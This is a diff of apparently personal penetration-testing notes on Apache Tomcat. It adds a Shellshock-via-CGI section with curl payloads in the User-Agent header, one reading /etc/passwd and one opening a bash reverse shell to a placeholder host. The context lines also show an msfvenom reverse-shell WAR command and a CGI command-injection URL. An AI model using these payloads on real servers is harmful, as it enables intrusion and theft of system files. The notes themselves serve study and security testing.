@@ -83,7 +83,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f war > backup.w
 It relies on the AJP service which is usually on port 8009
 
 ## Tomcat CGI
-A CGI Servlet is a middleware program that handles requests from the web browser and forwards them to CGI-compliant scripts that handle the processing for external resources (eg. a database).
+A *Common Gateway Interface (CGI)* Servlet is a middleware program that handles requests from the web browser and forwards them to CGI-compliant scripts that handle the processing for external resources (eg. a database).
 
 **CGI Pros**:
 - Simple and effective for generating dynamic web content
@@ -102,3 +102,19 @@ This causes the CGI Servlet to parse the query string and passes it to the CGI s
 However on Windows, because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script, this can lead to OS command injection attacks. 
 
 eg. `http://example.com/cgi-bin/hello.bat?&dir`, this would execute the `dir` command due to the `&` being added.
+
+### Shellshock via CGI
+Some old versions are bash can be exploited to save env vars incorrectly. This could allow for OS command injection.
+
+```bash
+env y='() { :;}; echo vulnerable' bash -c "not vulnerable"
+```
+The `() { :;};` returns an exit code of 0, but when it is imported, it will run the echo command.
+
+We could slip this in the user-agent field:
+```bash
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://example.com/cgi-bin/access.cgi
+```
+```bash
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[IP]/[PORT] 0>&1' http://example.com/cgi-bin/access.cgi
+```
